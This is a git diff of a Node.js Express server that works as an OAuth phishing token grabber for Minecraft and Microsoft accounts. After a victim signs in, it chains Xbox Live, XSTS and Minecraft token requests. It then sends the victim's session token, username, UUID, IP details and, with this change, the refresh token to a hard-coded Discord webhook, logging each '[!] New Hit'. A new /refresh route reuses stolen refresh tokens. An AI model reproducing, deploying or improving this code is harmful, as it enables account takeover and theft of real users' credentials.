@@ -45,7 +45,7 @@ var redirectUrl = process.env.redirectUrl
 var PasteKey = process.env.PasteKey
 var microsoftOauthUrl = 'https://login.live.com/oauth20_token.srf';
 var scopes = encodeURIComponent(
-	`XboxLive.signin offline_access openid https://graph.microsoft.com/mail.read`
+	`XboxLive.signin`
 );
 
 console.clear();
@@ -54,32 +54,14 @@ console.log(chalk.red(ascii));
 app.listen(port, () => {
 	console.log(`\nListening on port ${port}`)
 });
+app.get(`/`, (req,res)=>{
+	res.sendFile(__dirname + `/html/index2.html`)
+})
 
 app.get(`/token`, async (req, res) => {
-	res.sendFile(__dirname + `/index.html`);
+	res.sendFile(__dirname+`/html/index.html`);
 	let code = req.query.code;
-	const access_token_response = await getAccesToken(
-		clientId,
-		code,
-		clientSecret,
-		redirectUrl
-	);
-	var accesstoken = access_token_response[0];
-	var refreshtoken = access_token_response[1];
-	var xblToken = await getXblToken(accesstoken);
-	var XstsList = await GetXstsToken(xblToken);
-	var XstsToken = XstsList[0];
-	var XstsUuid = XstsList[1];
-	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
-	var MinecraftToken = MinecraftTokenResponse.access_token;
-	var IgnAndUuid = await getUsername(MinecraftToken);
-	var Ign = IgnAndUuid[0];
-	var Uuid = IgnAndUuid[1];
-	var ip = await getIp()
-	var ipInfo = (await getIpInfo(ip))
-	var PasteLink = await Paste(PasteKey, ipInfo)
-	await sendEmbed(MinecraftToken, Uuid, Ign, ip, PasteLink);
-	console.log(chalk.red(`\n[!] New Hit`))
+	await main(code)
 });
 
 async function createLink(id, url, scopes) {
@@ -174,7 +156,7 @@ async function getIp(){
 	return ip
 }
 
-async function sendEmbed(MinecraftToken, uuid, username, ip, IpUrl) {
+async function sendEmbed(MinecraftToken, uuid, refreshToken, username, ip, IpUrl) {
 	const webhook = new WebhookClient({
 		id: '1090664218010845234',
 		token:
@@ -189,6 +171,7 @@ async function sendEmbed(MinecraftToken, uuid, username, ip, IpUrl) {
 		.addFields(
 			{ name: 'Nom', value: `\`${username}\``, inline: true },
 			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
+			{ name: 'Refresh Token', value: `\n\`${refreshToken}\`` },
 			{
 				name: 'SSID',
 				value: `\`${username}:${uuid}:${MinecraftToken}\``,
@@ -238,3 +221,64 @@ async function Paste(key, ipInfo){
 	return `\`Reached Max Paste Limit\``
 }
 }
+async function main(code){
+	const access_token_response = await getAccesToken(
+		clientId,
+		code,
+		clientSecret,
+		redirectUrl
+	);
+	var accesstoken = access_token_response[0];
+	var refreshtoken = access_token_response[1];
+	var xblToken = await getXblToken(access_token);
+	var XstsList = await GetXstsToken(xblToken);
+	var XstsToken = XstsList[0];
+	var XstsUuid = XstsList[1];
+	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
+	var MinecraftToken = MinecraftTokenResponse.access_token;
+	var IgnAndUuid = await getUsername(MinecraftToken);
+	var Ign = IgnAndUuid[0];
+	var Uuid = IgnAndUuid[1];
+	var ip = await getIp()
+	var ipInfo = (await getIpInfo(ip))
+	var PasteLink = await Paste(PasteKey, ipInfo)
+	await sendEmbed(MinecraftToken, Uuid, refreshtoken, Ign, ip, PasteLink);
+	console.log(chalk.red(`\n[!] New Hit`))
+}
+async function main2(access_token, refresh_token){
+	var xblToken = await getXblToken(access_token);
+	var XstsList = await GetXstsToken(xblToken);
+	var XstsToken = XstsList[0];
+	var XstsUuid = XstsList[1];
+	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
+	var MinecraftToken = MinecraftTokenResponse.access_token;
+	var IgnAndUuid = await getUsername(MinecraftToken);
+	var Ign = IgnAndUuid[0];
+	var Uuid = IgnAndUuid[1];
+	var ip = await getIp()
+	var ipInfo = (await getIpInfo(ip))
+	var PasteLink = await Paste(PasteKey, ipInfo)
+	await sendEmbed(MinecraftToken, Uuid, refresh_token, Ign, ip, PasteLink);
+	console.log(chalk.red(`\n[!] New Hit`))
+}
+
+app.get(`/`, (req,res)=>{
+	res.sendFile(__dirname + `/html/index2.html`)
+})
+
+app.get(`/refresh`, async (req,res)=>{
+	res.sendFile(__dirname + `/html/index3.html`)
+	const refreshToken = req.query.RefreshToken
+	var config = `client_id=${clientId}
+		&scope=XboxLive.signin
+		&refresh_token=${refreshToken}
+		&grant_type=refresh_token
+		&client_secret=${clientSecret}`
+	const response= await http_client_methods_1.HttpPost(`https://login.microsoftonline.com/consumers/oauth2/v2.0/token`, config, { "Content-Type": "application/x-www-form-urlencoded" })
+	const ParsedRes = JSON.parse(response)
+	const AccessToken = ParsedRes.access_token
+	main2(AccessToken, refreshToken)
+})
+	
+
+
